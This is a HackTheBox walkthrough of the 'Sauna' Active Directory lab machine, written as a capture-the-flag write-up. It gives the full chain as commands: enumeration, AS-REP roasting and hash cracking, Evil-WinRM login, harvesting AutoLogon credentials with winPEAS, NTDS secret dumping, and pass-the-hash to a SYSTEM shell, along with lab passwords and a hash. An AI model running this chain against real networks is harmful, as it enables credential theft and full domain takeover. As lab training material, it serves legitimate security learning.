---
title: "HackTheBox: Sauna | Walkthrough"
date: 2020-08-16
categories: [hackthebox]
tags: [active-directory, kerberos, impacket, windows, privesc]
---

## Enumeration

```bash
nmap -A 10.10.10.175 -o nmap
````

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap
3269/tcp open  tcpwrapped
```

The website reveals some employee names. Using the convention of **first initial + last name**, we can build a potential username list:

```text
fsmith
scoins
btaylor
sdriver
hbear
skerb
```

## Exploiting Kerberos (AS-REP Roasting)

Using **impacket-GetNPUsers** to test for users without pre-authentication:

```bash
cd /usr/share/doc/python3-impacket/examples
./GetNPUsers.py -usersfile ~/hackthebox/sauna/users.txt -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/
```

This yields an AS-REP hash. Save it to a file:

```bash
vi ~/hackthebox/sauna/hash
```

Now crack it with John:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep ~/hackthebox/sauna/hash
```

We recover:

```
fsmith : Thestrokes23
```

## User Shell

Login with Evil-WinRM:

```bash
./evil-winrm.rb -i 10.10.10.175 -u fsmith -p Thestrokes23
```

We now have a shell as `fsmith`.

```powershell
*Evil-WinRM* PS C:\Users\FSmith\Desktop> net user
```

```
Administrator  FSmith  Guest
HSmith         krbtgt  svc_loanmgr
```

We see a **service account**: `svc_loanmgr`.

Checking details:

```powershell
*Evil-WinRM* PS C:\Users\FSmith\Desktop> net user svc_loanmgr
```

The account is active, never expires.

## Privilege Escalation

Let’s upload **winPEAS** to enumerate:

```powershell
upload /tools/winPEAS.exe .
.\winPEAS.exe
```

Output shows **AutoLogon credentials**:

```
DefaultDomainName :  EGOTISTICALBANK
DefaultUserName   :  EGOTISTICALBANK\svc_loanmgr
DefaultPassword   :  Moneymakestheworldgoround!
```

Perfect — valid credentials!

## Extracting Secrets

Test credentials with **lookupsid.py**:

```bash
./lookupsid.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr:"Moneymakestheworldgoround!"@10.10.10.175
```

It works. Next, try dumping hashes:

```bash
./secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr:"Moneymakestheworldgoround!"@10.10.10.175
```

We successfully dump the **NTDS.dit** secrets, including the **Administrator hash**:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
```

## Administrator Shell

Use **Pass-the-Hash** with psexec:

```bash
./psexec.py EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff
```

And we land a **SYSTEM shell**. Rooted ✅

